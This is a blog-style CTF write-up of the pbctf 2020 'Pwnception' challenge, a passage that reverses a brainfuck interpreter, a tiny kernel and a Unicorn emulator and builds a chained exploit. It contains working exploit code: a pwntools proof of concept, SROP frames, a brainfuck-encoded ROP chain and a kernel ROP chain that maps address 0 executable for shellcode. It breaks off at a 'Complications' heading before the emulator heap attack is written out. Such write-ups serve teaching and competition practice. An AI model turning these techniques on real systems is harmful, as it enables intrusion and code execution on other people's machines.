---
layout: post
title:  "pbctf 2020 - Pwnception"
date:   2020-12-08 17:30:00 +0800
categories: pwn
tags: pbctf-2020
---

# Introduction

I was pretty busy last weekend, but I managed to spend a few hours on pbctf. I was only able to solve JHeap ([Writeup here](https://gist.github.com/farazsth98/24b7f8c1b23cdfb6da17dff804000dc3)) in the first three of those few hours. I spent the rest of my time on Pwnception.

I wasn't able to solve this during the CTF as it was my first time doing a full chain exploit like this (userland -> kernel -> emulator). After the CTF ended, with the help of hints and tips from a few people, I managed to finally solve the challenge. I was able to learn a ton of new things, which I'll document in this blog post for future me (and hopefully you the reader will find this information useful as well!).

# Challenge

* **Category**: pwn
* **Points**: 383
* **Solves**: 6

>I didn't trust any software to run my bf programs, so I wrote my own. But then I didn't trust the kernel to run my interpreter, so I wrote my own. But then I didn't trust anything to run my kernel, so I wrote my own.
>
>`nc pwnception.chal.perfect.blue 1`
>
>By: vakzz

[Challenge files can be found here](https://github.com/sajjadium/CTFium/tree/master/pbctf/2020/Pwnception) (Cheers to sajjadium for archiving CTF files like this).

# TL;DR

As description states, this challenge pretty much contains a userland binary, a kernel binary, and an emulator (written using the unicorn engine emulator framework) that emulates the userland and kernel together.

[You can find the final exploit script here](https://github.com/Super-Guesser/ctf/blob/master/pbCTF2020/pwn/pwnception/exploit.py).

#### Userland

The userland binary is a brainfuck interpreter. In brainfuck, you have whats called a **data pointer** that you can shift forwards and backwards using the `>` and `<` operators respectively. The data pointer in the userland binary pointed to a stack buffer, and there were no bounds checks on the `>` and `<` operators, so you could shift the data pointer up the stack to the return address and modify it. This was the userland bug you could use to craft your ROP chain on the stack and return to it.

#### Kernel

Once you have code execution in the userland, you can talk to the kernel. The kernel was also a very small binary. Only the `sys_read`, `sys_write`, and `sys_open` system calls were implemented. `sys_open` had a stack buffer overflow where it copied the filename from userland to a kernel stack buffer without doing any bounds checking. The only catch was that the copy would stop at null bytes, so I had to find a nice way to ROP, map a page as RWX for shellcode, read shellcode into it, and finally jump to the shellcode.

#### Emulator

Once you have code execution in the kernel, you are able to call `malloc` and `free` inside the emulator at will through the `int 0x71` interrupt. You are only ever allowed access to one malloc'd chunk at a time, and when freeing the chunk, the pointer is not zeroed, which results in a UAF. You are also allowed to read / write the chunks contents at will (any size), which can be used for a heap overflow (although I didn't do that).

I first used the UAF to leak a `libunicorn.so.1` address, then I did a tcache dup attack to leak the address of `vasprintf@LIBC` from the GOT of `libunicorn`, and finally I did a second tcache dup attack to overwrite `__free_hook` with `system` to get a shell.

# Reversing - Userland

When I first looked at the challenge, it had 4 solves (the most at that time, excluding the baby pwn challenge), so I thought it would be a good one to try and complete in the few hours that I had.

I initially ignored the `main` and `kernel` binaries, and only reversed the userland binary. This was in fact that easiest part of this challenge, as the userland binary was very simple to reverse and exploit.

The binary essentially just reads `0xfff` bytes of brainfuck from stdin. You end your brainfuck code with `!`. You can follow the `!` up with any user input as needed (the `,` operator can be used to get user input):

```
$ ./userland 
Give me some bf (end with a !): 
```

The binary was stripped, but I opened it up in IDA and looked for an xref to the "Give me some bf" string and found the `run` function (the `main` function called the `run` function). I spotted the bug almost immediately (some code removed for brevity):

```c
__int64 run()
{
  unsigned __int64 bf_rip; // [rsp+0h] [rbp-2050h]
  char *p_data_ptr; // [rsp+10h] [rbp-2040h]
  unsigned __int64 qw_bf_len; // [rsp+28h] [rbp-2028h]
  char data_buf; // [rsp+1040h] [rbp-1010h]

  memset(&data_buf, 0, 0x1000uLL);
  qw_bf_len = read_n(&bf_code, 0xFFFuLL);
  bf_rip = 0LL;
  p_data_ptr = &data_buf;
  while ( bf_rip <= qw_bf_len )
  {
    // [...]
    switch ( *(bf_rip + 0x6010A0) )
    {
      // [...]
      case '<':
        --p_data_ptr;
        break;
      case '>':
        ++p_data_ptr;
        break;
      // [...]
    }
    bf_rip++;
  }
}
```

The binary first reads the input into `&bf_code`, which is at `0x6010a0`. It then goes through each byte of the code and interprets it. You'll also note that `data_buf` is a buffer on the stack, and the `p_data_ptr` points to the start of `data_buf` initially. When the code interprets the `<` and `>` operators, it simply moves the `p_data_ptr` without any bounds checking, which is the bug.

The PoC I wrote essentially uses this bug to set the `p_data_ptr` to point to the return address on the stack, and then overwrites it with "AAAA":

```python
#!/usr/bin/env python3

from pwn import *

p = process("./userland")

# Userland: loop until bf_rip points to return address
bf  = b"+[>,]" # Skip until right before canary
bf += b">"*0x12 # Skip past canary and saved rbp
bf += b"+[,>,]" # Start overwriting return address
bf += b"!"

# This is the input to the `,` operators from above
bf += b"\x01"*(4101) + b"\x00" # Enough 0x1 bytes to get to ret addr, then stop
bf += b"A\x01"*4 # Overwrite return address
bf += b"\x00"*2 # Two null bytes to stop the bof

p.sendafter("!): ", bf)

p.interactive()
```

If you're not familiar with brainfuck, it's really easy. Just have a read of [this page](http://cocoadocs.org/docsets/Brainfuck/0.0.1/). I basically used `gdb.attach(p)` and experimentally found that moving the data pointer forward 4101 times in a loop gets us to one byte before the canary, at which point the "\x00" byte will stop the loop. 

We can't skip the canary in the loop because looping requires us to use the `,` operator to write either a 0x1 byte to continue the loop, or a 0x0 byte to stop the loop (for control flow info, [this](https://gist.github.com/roachhd/dce54bec8ba55fb17d3a) might help), so we instead skip past the canary and saved rbp manually with the required number of `>` operators.

Once we've done that, we start yet another loop. This time, we read a byte, move the data pointer forward by one, and then read our condition byte. As long as our condition byte is non-null, we continue looping and overwriting one byte at a time (this is where the `b"A\x01"*4` comes from). Once we've finished overwriting the stack, we can insert two null bytes to stop this loop and finish.

# Reversing - Kernel

After I'd finished up with the PoC above, I decided to look at the kernel. However, I've only ever worked with the FreeBSD kernel, never the Linux kernel, so I didn't really know how to reverse the binary. `file` showed that it was just `data`:

```
$ file kernel
kernel: data
```

At this point, I decided to ignore the kernel and reverse the emulator binary instead. I did that for a while to understand how it works, but I'll get into that in the next section.

Once the CTF was over, with the help of ptr-yudai (from zer0pts) and Nspace (from Organizers), I figured out how to reverse the kernel. I'll document the steps I took here.

### Loading the kernel in IDA

The first thing I learned is that the kernel base in Linux (without kASLR enabled, I presume) is at `0xffffffff81000000`. Once I learned this, I opened the kernel binary up in IDA in 64-bit mode, with the "Loading offset" set to `0xffffffff81000000`.

Scrolling through the code, at offset `0xffffffff810000ba`, you'll see the following:

```nasm
seg000:FFFFFFFF810000BA ; ---------------------------------------------------------------------------
seg000:FFFFFFFF810000BA
seg000:FFFFFFFF810000BA loc_FFFFFFFF810000BA:                   ; DATA XREF: seg000:off_FFFFFFFF8100001D↑o
seg000:FFFFFFFF810000BA                 call    ds:off_FFFFFFFF81000900[rax*8]
seg000:FFFFFFFF810000C1                 iret
seg000:FFFFFFFF810000C1 ; ---------------------------------------------------------------------------
```

Double clicking on `off_FFFFFFFF81000900` to see what that is, you see this:

```nasm
seg000:FFFFFFFF81000900 off_FFFFFFFF81000900 dq offset sub_FFFFFFFF810000E0
seg000:FFFFFFFF81000900                                         ; DATA XREF: seg000:loc_FFFFFFFF810000BA↑r
seg000:FFFFFFFF81000908                 db  0Fh
seg000:FFFFFFFF81000909                 db    1
seg000:FFFFFFFF8100090A                 dw 8100h, 2 dup(0FFFFh)
seg000:FFFFFFFF81000910                 db  3Bh ; ;
seg000:FFFFFFFF81000911                 db 1, 0, 81h, 4 dup(0FFh)
seg000:FFFFFFFF81000918                 dq 0FFFFFFFF81000193h, 0FFFFFFFF81000199h, 0FFFFFFFF8100019Fh
seg000:FFFFFFFF81000918                 dq 0FFFFFFFF810001A5h, 0FFFFFFFF810001ABh, 0FFFFFFFF810001B1h
```

It is evident from the `call ds:off_FFFFFFFF81000900[rax*8]` that this is some type of a table of function pointers. At offset 0, we have the `sub_FFFFFFFF810000E0` function. The next QWORD offsets seem to be incorrect, but then starting at `0xFFFFFFFF81000918` again, we have a huge number of function pointers.

In order to fix the incorrect offsets, I clicked on `0x90A` and `0x911` and pressed U to undefine whatever is at those offsets. Then, I right clicked on `0x908` and `0x910` and picked "Quadro Word" for their representations. I then finally right clicked them again, and picked "Data". This ended up defining them as jumps to functions:

```nasm
seg000:FFFFFFFF81000900 off_FFFFFFFF81000900 dq offset sub_FFFFFFFF810000E0
seg000:FFFFFFFF81000900                                         ; DATA XREF: seg000:loc_FFFFFFFF810000BA↑r
seg000:FFFFFFFF81000908                 dq offset sub_FFFFFFFF8100010F
seg000:FFFFFFFF81000910                 dq offset sub_FFFFFFFF8100013B
```

Finally, we're able to look at reversing some functions, but first, what are these function pointers exactly?

### What are these function pointers?

If you click to view any of the function pointers after the first three (i.e after the pointer to `sub_FFFFFFFF8100013B`), you'll see that they just point to some huge array of data at `0xFFFFFFFF81000190`. This is obviously incorrect, but if you undefine this data and then mark it as code (addresses `0xFFFFFFFF81000193`, `0xFFFFFFFF81000199`, etc should be marked as code), then you'll see that all of these function pointers essentially just do the following:

```nasm
call sub_FFFFFFFF81000096
retn
```

`sub_FFFFFFFF81000096` in turn does the following:

```nasm
mov rsi, 0FFFFFFFF810000ACh
mov ecx, 0Eh
mov dx, 38Fh
rep outsb
retn
```

`0xFFFFFFFF810000AC` contains a string that says "Unimplemented". We can take a guess and say that its taking the string and outputting it to the terminal using the `rep outsb` instruction somehow (how exactly its doing that will become evident in the **Reversing - Emulator** section.

With the above information in mind, we can deduce that this table of functions is the system call table. We know the first three entries point to actual functions, while the rest just call a function that prints "Unimplemented" to the screen. 

[Looking at a system call table like this](https://filippo.io/linux-syscall-table/), we know the first three system calls are `sys_read`, `sys_write`, and `sys_open`. We now know that the kernel only implements these three system calls in the system call table.

### Reversing the functions

Looking at `sub_FFFFFFFF810000E0` (i.e `sys_read`), we see the following:

```nasm
mov     rax, 0FFFFFFFFFFFFFFFFh
cmp     rdi, 0
jnz     short loc_FFFFFFFF8100010B ; Ensure RDI is 0 (fd = stdin)

mov     r13, 800000000000h
cmp     r13, rsi
jbe     short loc_FFFFFFFF8100010B ; Ensure RSI is a userspace addr (buf)

mov     r11, rdx
mov     rcx, rdx
mov     rdi, rsi
mov     dx, 38Fh
rep insb ; Repeat `insb` RDX times on the 0x38f IO port, presumably to read input

loc_FFFFFFFF8100010B:          
mov     rax, r11
retn
```

Similarly for `sub_FFFFFFFF8100010F` (i.e `sys_write`), we see the following:

```nasm
mov     rax, 0FFFFFFFFFFFFFFFFh
cmp     rdi, 1
jnz     short loc_FFFFFFFF81000137 ; Ensure RDI is 1 (fd = stdout)

mov     r13, 800000000000h
cmp     r13, rsi
jbe     short loc_FFFFFFFF81000137 ; Ensure RSI is a userspace addr (buf)

mov     r11, rdx
mov     rcx, rdx
mov     dx, 38Fh
rep outsb ; Repeat `outsb` RDX times on the 0x38f IO port, presumably to write input

loc_FFFFFFFF81000137:
mov     rax, r11
retn
```

Both of the above functions don't seem to have any bugs in them, but then we get to `sub_FFFFFFFF8100013B` (i.e `sys_open`):

```nasm
push    rbp
mov     rbp, rsp
sub     rsp, 50h
lea     r13, [rbp-40h] ; Stack space for filename

loc_FFFFFFFF81000147:
mov     al, [rdi] ; Copy byte from username filename buf to al
mov     [r13+0], al ; Move byte into kernel stack filename buf
inc     rdi ; Increment userspace filename buf ptr
inc     r13 ; Increment kernel stack filename buf ptr
cmp     byte ptr [rdi], 0 ; Check next userspace buf byte to see if its null
jnz     short loc_FFFFFFFF81000147 ; If not NULL, repeat to copy next byte

lea     rdi, [rbp-40h] ; Load kernel stack filename buf address into RDI
mov     rsi, r13 ; Load kernel stack filename buf end ptr into RSI
sub     rsi, rdi ; Get the number of bytes of the filename into RSI
call    sub_FFFFFFFF8100007F ; Call kernel open syscall handler

mov     rsi, 0FFFFFFFF81000181h ; " cannot be opened\n" string address into RSI
mov     ecx, 12h
mov     dx, 38Fh
rep outsb ; Print the " cannot be opened\n" string
mov     rsi, rdx
leave
retn
```

I've commented the code above. `sub_FFFFFFFF8100007F` is the kernel open syscall handler, and it just prints out the name of the file (not important).

### The bug

Looking at the assembly, it is evident that there is a stack buffer overflow here as the copy loop only stops when it gets to a NULL byte. If we don't insert any NULL bytes, we can keep overwriting the stack, including the return address.

The only catch here is that both userland and kernel addresses contain NULL bytes in them, so it looks like we'll only be able to partially overwrite the already existing return address initially. We'll  have to find a way to use this partial overwrite to get kernel code execution.

We can't run the kernel without the emulator though, so before we can continue down this path, we have to reverse the emulator.

# Reversing - Emulator

I went into a lot of detail about reversing the kernel. The emulator was pretty straightforward to reverse though, so I'll only state what it's doing. I would still recommend you reverse the emulator yourself (you can use this writeup as a guide of course) because there is a lot to learn.

I found [this unofficial unicorn engine documentation](https://hackmd.io/@K-atc/rJTUtGwuW?type=view), and the [unicorn.h](https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h), [x86.h](https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/x86.h), and [uc.c](https://github.com/unicorn-engine/unicorn/blob/master/uc.c) files very useful when it came to trying to understand the unicorn engine framework code.

## How the emulator works

This is the part that really confused the heck out of me. You have to think of the userspace, kernel, and emulator as separate programs, but they all work together, have their own memory regions mapped, etc. It can get really confusing to keep all of this context in your mind at once, so it's best if you follow along somehow from here on out.

### Main function

The emulator's main function first initializes two semaphores that I call the `syscall_initiated` and `syscall_finished` semaphores.

Next it creates two threads, one for the emulated kernel and one for the emulated userspace.

Finally, it just waits for the threads to join.

### Userland thread function

The userland thread function first opens and parses the userland binary. It then maps the userland binary's contents into the emulator memory space, and then maps each memory segment of the userland binary into the emulated userland. It stores these memory mappings in a global array of `userland_mappings` structs. The struct looks like the following:

```c
struct userland_emu_mappings
{
  void *userland_addr;
  int64_t size;
  int64_t perms;
  void *emu_mapped_addr; // Actual address mapped in the emulator
};
```

Next, it maps 256 pages at address `0x7FFFFFEFF000` into the userland with RW permissions. Note that this means that the userland gets to access address `0x7FFFFFEFF000`, but this exact memory address isn't actually mapped into the emulator binary (so you can't view it in GDB). The corresponding address that's mapped in the emulator is at `PIE_base + 0x1204060` (i.e if you store some data into address `0x7FFFFFEFF000` through the userland binary, that data will show up at address `PIE_base + 0x1204060` in the emulator binary)

It also maps 256 pages at address `0x600000000000` into the userland with RW permissions. I'm not entirely sure what this memory region was for, so I ignored it.

Next, it uses `uc_hook_add` to add three hooks (with three different types):

1. The first hook is a `UC_HOOK_INSN` type, which hooks onto any syscall instructions initiated by the userland. I'm not 100% sure what the syscall hook handler function does, but it will first save the values of the RAX, RDI, RSI, RDX, R9, MM7, and R8 userland registers into the emulator's global memory space. Then, it will post on the `syscall_initiated` semaphore to wake the kernel up, and finally it'll wait on the `syscall_finished` semaphore to wait on the kernel. It does a few other things but I don't know what those are and it wasn't important.

2. The second hook is a combination of hook types. I called it the `UC_HOOK_RWF_UNMAPPED`, where RWF stands for Read/Write/Fetch. Basically this hook triggers whenever you access an unmapped memory region in the userland. The handler for this hook simply posts the `syscall_initiated` semaphore and returns without doing anything else.

3. The third is a `UC_HOOK_CODE`, which hooks on any code executed within the userland's memory space. The handler for this is a no-op, so my assumption is that this was used by vakzz during development to debug the userland binary's memory / register state when needed. Not important for us.

The code then sets the userland RSP to `0x7FFFFFFFE000` (no ASLR on the stack), and the userland RIP to the entry point of the binary. It also sets up the FS and GS registers to 0, and finally posts on the `syscall_initiated` semaphore to wake the kernel up (so the kernel can set itself up as well, more on that in the next section). 

It then just waits on the `syscall_finished` semaphore, after which point it uses `uc_emu_start` to start running the userland binary.

### Kernel thread function

The kernel thread function first opens and maps the kernel binary's contents into the emulator's memory.

Next, it creates a new unicorn engine instance.

It then waits on the `syscall_initiated` semaphore. This will be posted on by the userland binary once the userland has been set up.

Once the semaphore is posted, it goes through the global list of userland memory mappings and maps each userland memory region into the kernel's memory space.

It then maps 256 pages at address `0x7FFFFFEFF000` into the kernel with RW permissions. Note that this same memory region was mapped into the userland as well, which means that the userland and kernel both share this memory region (useful for our exploit).

Next, it maps 256 pages at addresses `0xFFFFFFFF81000000` and `0xFFFF8801FFEFF000` for the kernel text segment and the kernel stack respectively (RX and RW perms respectively). It copies the kernel binary's contents into the kernel text segment.

It then adds a few hooks:

1. A `UC_HOOK_CODE` hook is added on the kernel text segment. This hook is later replaced by number 6 on this list, so we ignore it.

2. A `UC_HOOK_INSN` hook is added on the `in` instruction (which includes the `insb` instruction). The handler for this checks to make sure that the IO port number is `0x38f`, and that a `size` parameter is equal to `1`. Once those checks pass, it will do a `read(0, &buf, 1)`, where `buf` is the address of the buffer pointed to by the kernel's RDI register at the time of the `in` instruction.

3. A `UC_HOOK_INSN` hook is added on the `out` instruction (which includes the `outsb` instruction). The handler does something similar to the `in` instruction handler, except it does a `write(1, &buf, 1)` instead.

4. A `UC_HOOK_INTR` hook is added to hook on any interrupts. This is further analyzed below, as it is a little too complicated to fit into this dot point.

5. A `UC_HOOK_RWF_UNMAPPED` is added. The handler simply stops the kernel if any unmapped address is accessed.

6. A `UC_HOOK_CODE` is added on the kernel text segment. The handler is that no-op function that was mentioned in the userland code hook, so we can ignore this.

7. A `UC_HOOK_CODE` is added on the first page of the kernel's address space (i.e at address 0) with the same no-op handler. This is a big hint. If our assumption about the no-op function is correct (that it was used for debugging purposes by vakzz), then this means that vakzz somehow mapped address 0 into the kernel, so our exploit should probably try to achieve that.

Finally, `uc_emu_start` is used to start up the kernel binary.

### The kernel interrupt handler

The kernel interrupt handler code basically handles two interrupts: `int 0x70` and `int 0x71`.

#### int 0x70

When the kernel executes `int 0x70`, the interrupt handler checks the RAX register. It does a few different things based on what value RAX holds:

1. When RAX == `0x9e` and RDI == `0x1002`, it just stores RSI into some global variable. Probably used for debugging purposes.

2. When RAX == `0xf`, it reads a bunch of kernel memory into a global array. Again, probably just used for debugging purposes.

3. When RAX == `0xa`, it calls `uc_mem_protect` to change the permissions of the kernel memory address stored in RDI. RSI is used as the size argument, and RDX is used as the permissions argument. Assuming we do a ROP chain in the kernel and control these registers, we can change the protections of the kernel text segment to RWX and overwrite it.

4. When RAX == `0x9`, it calls `uc_mem_map` to map the address stored in RDI into the kernel. Again, RSI is used as the size argument and RDX is used as the permissions argument. A ROP chain would allow us to map address 0 as RWX, which is what we noticed from the code hook from above.

#### int 0x71

When the kernel executes `int 0x71`, the interrupt handler again checks the RAX register.

1. When RAX == `0x0`, the emulator will do a `malloc(RDI)`. The pointer returned by `malloc` is stored in a global variable at `PIE_base + 0x1a061e0`.

2. When RAX == `0x1`, the emulator will do a `uc_mem_read` to read data from the address stored in RDI, into our allocated chunk. The number of bytes to be copied is taken from RSI. We can use this to cause a heap overflow.

3. When RAX == `0x2`, the emulator will do a `uc_mem_write` to write data to the address stored in RDI, from our allocated chunk. The number of bytes copied is taken from RSI. We can read our chunk's data using this.

4. When RAX == `0x3`, the emulator will do a `free(ptr)` to free the pointer stored in the global variable. The pointer isn't nulled out though, so this compared with the previous two options gives us a UAF primitive in the emulator binary.

# Attack plan

Now that we've reversed everything, we can formulate a plan of attack:

1. First, we use the bug in the userland binary to ROP in the userland. The userland binary is tiny and doesn't have a lot of gadgets, so we have to find a way to control the required registers in order to first call `sys_read` to read our long file name into memory, and then call `sys_open` to trigger the kernel buffer overflow.

2. Once we've triggered the kernel buffer overflow, remember that we still only have a partial overwrite of the kernel return address. We need to find a way to use this partial overwrite to map address 0 as RWX through the `int 0x70` interrupt handler, and then read our shellcode into address 0. We can then just jump to this shellcode.

3. Once we have shellcode execution in the kernel, we can use `int 0x71` at will to trigger the heap bugs in the emulator. My plan of attack is to get a Libc leak, overwrite free hook with system, then free a chunk whose contents are just `"/bin/sh\x00"` to get a shell.

Note that for the rest of the writeup, I'll only be showing chunks of my exploit script. If you want to see the full exploit script, you can find it [here](https://github.com/Super-Guesser/ctf/blob/master/pbCTF2020/pwn/pwnception/exploit.py).

# Userland ROP

First, in order to ROP in the userland, I make use of [SROP](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming). This isn't fully necessary since we do indeed have enough gadgets to control RAX, RDI, RSI, and RDX, but I thought I'd try to implement it.

I first used our userland PoC to put some magic bytes into the stack (remember that the stack is actually mapped at some random address inside the emulator). Then, using `gdb-gef`'s `search-pattern` command, I find my magic bytes bytes and check the saved RBP. This lets me find the return address, which is `0x7fffffffdfa8`. Remember that the userland stack has no ASLR **in the context of the userland**.

The reason this is important is because when we do SROP, our entire SROP frame will take up a chunk of space on the stack. When we actually do the SROP, we want to set our new RSP value to right after the frame, where our ROP chain can continue after the fact. In order to be able to do that though, we need the current RSP.

I first created a helper `srop` function (the idea for this was taken from jinmo's exploit). I also wrote a helper function that converts our ROP chain into brainfuck code:

```python
userland_ret_addr = 0x7fffffffdfa8 # Always constant in the emulator

# SigReturn Oriented Programming                                                
# `srop_idx` is the current srop frame's index. The index starts at 1 for the   
# first frame, and increases by 1 for every subsequent frame. It lets us set    
# RSP to right after each frame so we can continue ropping as needed
def srop(syscall, rip, arg1, arg2, arg3, srop_idx):                             
    # Set up frame                                                              
    frame = SigreturnFrame()                                                    
    frame.rax = syscall                                                         
    frame.rdi = arg1                                                            
    frame.rsi = arg2                                                            
    frame.rdx = arg3                                                            
                                                                                
    # Our final sropchain will be 3 * 8 bytes + len(frame), so we set RSP to       
    # After this, so that the next `ret` instruction will return into our new   
    # input that is after the frame                                             
    frame.rsp = userland_ret_addr + srop_idx * len(frame) + 0x18                
    frame.rip = rip                                                             
                                                                                
    return frame

# Convert a ropchain into bf code                                               
# +[,>,] is used to loop and overwrite past the return address, so we just have 
# to write each byte followed by a non-null byte to continue looping.           
# We end our loop when we're finished by inserting two null bytes which stops   
# the loop.                                                                     
def bf_rop(ropchain):                                                           
    final = b""                                                                 
                                                                                
    for byte in ropchain:                                                       
        final += bytes([byte]) + b"\x01"                                        
                                                                                
    return final
```

The reason for adding `0x18` when setting `frame.rsp` will become evident soon.

Next, our plan is to get to the return address on the userland stack, and then overwrite it with our SROP chain. We need to first do a `sys_read` to read our filename (basically kernel stack buffer overflow payload) into some memory region. Then, we need to do a `sys_open` syscall to trigger the kernel stack buffer overflow bug. The following code does just that:

```python
syscall_ret = 0x400cf2
pop_rax = 0x400121

# This address is mapped in both the kernel and the userland, so we use this    
# to store any input that needs to be shared between them                       
shared_buf = 0x7fffffeff000

# Userland: loop until p_data_ptr points to return address                      
bf  = b"+[>,]" # Skip until right before canary                                 
bf += b">"*0x12 # Skip past canary and saved rbp                                
bf += b"+[,>,]" # Start overwriting return address                              
bf += b"!"                                                                      
bf += b"\x01"*(4101) + b"\x00" # Enough 0x1 bytes to get to ret addr, then stop 
                                                                                
# Now starts our ropchain in userland.                                          
# First we read a big filename into the shared buffer. This will trigger the    
# bof in sys_open in the kernel                                                 
frame1 = srop(0, syscall_ret, 0, shared_buf, len(krop1), 1)                     
urop1  = flat([pop_rax, 0xf, syscall_ret, frame1])                              
                                                                                
# Next we trigger the bof in the kernel by calling sys_open                     
frame2 = srop(2, syscall_ret, shared_buf, 0, 7, 2)                              
urop2  = flat([pop_rax, 0xf, syscall_ret, frame2])                              
                                                                                
bf += bf_rop(urop1) # Read filename into the shared buffer                      
bf += bf_rop(urop2) # Trigger sys_open bof                                      
bf += b"\x00"*2 # Two null bytes stops our userland bof loop                    
                                                                                
p.sendafter("!): ", bf)
```

First we get to the return address on the stack. Then, we do a `sys_read` call using SROP. We read into the shared buffer, with the size argument set to the length of our initial kernel ropchain (called `krop1`, which you will see in the next section). 

The actual ropchain (`urop1`) is `flat([pop_rax, 0xf, syscall_ret, frame1])`, which is the length of the frame + the length of three gadgets. The three gadgets will set up RAX, and then jump to a `syscall ; ret` gadget. The three gadgets are, in total, `3 * 8 == 0x18` bytes in size. This is the reason the `srop` function skips forward by `0x18` bytes when setting `frame.rsp`.

After the `sys_read`, we will return into our next gadget, which will be `urop2`. This will call `sys_open` with RDI set to the address of the buffer with our payload (i.e the filename). This should then trigger the kernel buffer overflow.

Finally, we send our userland ropchains in brainfuck format using our helper `bf_rop` function. The last two null bytes are there to stop the read loop in brainfuck.

The question now is, what do we partially overwrite our kernel stack's return address to?

# Kernel ROP

## Initial partial overwrite

With some help from vakzz, I learned that the following gadget lets us essentially re-trigger the kernel stack buffer overflow, but without the NULL byte restriction:

```
$ ROPgadget --binary ./kernel --rawArch=x86 --rawMode=64 --multibr --offset 0xffffffff81000000

[...]
0xffffffff8100008c : mov rcx, rsi ; mov dx, 0x38f ; rep insb byte ptr [rdi], dx ; ret
[...]
```

The reason this works is because of the state of the RDI and RSI registers when `sys_open` returns. RDI is going to be set to the kernel stack filename buffer, while RSI will be set to `0x38f`. Remember that the `in` (and subsequently `insb`) instruction is hooked by the emulator (see above in the **Reversing - Emulator** section). This lets us read 0x38f bytes into the kernel stack with no restrictions, which will easily let us ROP on the kernel heap.

Here's the code to trigger this (assume that we continue off from where we just sent our brainfuck code above, where it's waiting for us to input the filename):

```python
read_gadget = 0xffffffff8100008c # mov rcx, rsi; mov dx, 0x38f; rep insb; ret

# Prepare our initial kernel ropchain.                                          
# For this one, you can't have any null bytes as the bof stops on a null byte.  
# We know that when sys_open returns, RSI will be set to 0x38f, and RDI will be 
# set to the filename buffer on the kernel stack. This gadget will read RSI        
# bytes into the address in RDI (with no restrictions as it uses `read`), which 
# subsequently lets us re-trigger the kernel bof and ROP at will                
krop1 = flat([                                                                  
    b"\x82"*0x48, # Pad to kernel stack ret addr                                
    b"\x8c", # Partial overwrite to read gadget (see gadget above)              
])

p.send(krop1) # Partial overwrite kernel ret addr to read gadget
```

Once this is done, the emulator will be waiting for our input again. This new input will be the second kernel ROP chain.

## Actually ROP in the kernel

Now that we can ROP in the kernel, my plan was to use the `int 0x70 ; ret` gadget in the kernel to get address 0 mapped with RWX perms. Then, I want to use the read gadget from above to read shellcode into address 0, and then jump to the shellcode. 

To do all of that though, we need to control RAX, RDI, RSI, and RDX. Luckily for us, the userspace memory is mapped into the kernel, so we can use userspace gadgets. Note that we can't use SROP because it doesn't make sense to do a system call while in the kernel.

There were two sets of gadgets that could be chained together to control all of the registers. These were as follows:

```
0x0000000000400121 : pop rax ; ret
0x00000000004009d3 : mov rdi, rax ; jmp 0x400ca0 -> [not important] ; mov rax, rdi ; ret

0x0000000000400af3 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004008bd : mov rdx, r12 ; mov rsi, rbx ; call r13
```

First, there a few things to note: 

1. `ROPgadget` seems to have some kind of a bug here, as it stated that the `jmp` instruction in the gadget at `0x4009d3` jumped to `0x400ca3`. In reality, it jumps to `0x400ca0`, and I modified the gadget manually to say that above. This confused me initially, but luckily I went to check the gadget in GDB to see where it was actually jumping to, since it made no sense for actual code to jump to the middle of an instruction.

2. I added in the instructions after the `jmp` for the `0x4009d3` gadget, just so its easier to see whats going on.

The first two gadgets can be chained together to control the contents of RDI. The second two gadgets can be chained together to control RDX and RSI respectively. And of course, the first gadget lets us control RAX.

We also control R13, so we just point it to a `pop rax ; ret` gadget to pop the address of the current gadget off the stack so we can continue the ROP chain (we have to do this because the last gadget does a `call`, which will push the next address onto the stack. We need to pop this address off the stack to continue our ropchain).

With the plan in motion, we have the following ROPchain as `krop2`. The comments should be self-explanatory for this. Also, `kshellcode` is referenced here, but it will be shown in the next section.

We continue from above where the read gadget is waiting for us to input our actual kernel ropchain:

```python
# Userland gadgets and addresses                                                
main = 0x4005f1                                                                 
syscall_ret = 0x400cf2                                                          
pop_rax = 0x400121                                                              
xchg_rdi_rax = 0x4009d3                                                         
pop_4 = 0x400af3 # pop rbx, rbp, r12, r13 ; ret                                 
mov_2_call = 0x4008bd # mov rdx, r12 ; mov rsi, rbx ; call r13                  
userland_ret_addr = 0x7fffffffdfa8 # Always constant in the emulator            
                                                                                
# Kernel gadgets and addresses                                                  
kern_base = 0xffffffff81000000                                                  
int_0x70 = 0xffffffff810001db # int 0x70 ; ret                                  
read_gadget = 0xffffffff8100008c # mov rcx, rsi; mov dx, 0x38f; rep insb; ret

# Prepare our actual kernel ropchain.                                           
# We're able to use userland addresses because those addresses have been        
# mapped into the kernel in the kernel thread handler.                          
#                                                                               
# The plan is to set rdi to 0, rsi to 0x1000, rdx to 7, rax to 9, and then         
# trigger int 0x70. This will go into the kernel interrupt handler and then        
# trigger a `uc_mem_map` call, which will map addr 0 in the kernel for us.         
# Then we will use our read gadget to read shellcode into addr 0.               
#                                                                               
# Note that we can't actually use a syscall gadget here because it makes no        
# sense for the kernel itself to do a syscall.                                  
krop2 = flat([                                                                  
    # Map address 0                                                             
    b"\x83"*0x50, # Pad to kernel stack ret addr + 8, krop1 returns here
    pop_rax, 0, # We will set rdi to 0 next                                     
    xchg_rdi_rax, # Not actually an xchg gadget, but semantically the same         
    pop_4, 0x1000, 0, 7, pop_rax, # Pop rbx, rbp, r12, r13                      
    mov_2_call, # mov rdx, r12 ; mov rsi, rbx ; call r13                        
    pop_rax, 9, # Put 9 into rax for mmap                                       
    int_0x70, # Trigger call to uc_mem_map through IRQ 0x70                     
                                                                                
    # Read shellcode into address 0 using the read gadget                       
    pop_rax, 0, # Prepare to set RDI to 0                                       
    xchg_rdi_rax,                                                               
    pop_4, len(kshellcode), 0, 0, pop_rax,                                      
    mov_2_call, # rsi = len(shellcode)                                          
    read_gadget, # Read into address 0                                          
    0,# Jump to address 0                                                       
]).ljust(0x38f, b"\x00") # Pad to 0x38f to end the initial read gadget

p.send(krop2) # Fully ROP on the kernel, mmap addr 0, read shellcode there
```

# Pwn the emulator

After we send our `krop2` ropchain above, the kernel will be waiting for us to send our shellcode, once we send our shellcode, the kernel will execute it.

With this, we now have access to `int 0x71` (there were no gadgets in the kernel for this). We can use this to malloc / free chunks in the emulator at will. We can also use this to read from / write to the chunks at will. This lets us trigger either a UAF or a heap overflow (or both) in the emulator.

## Complications

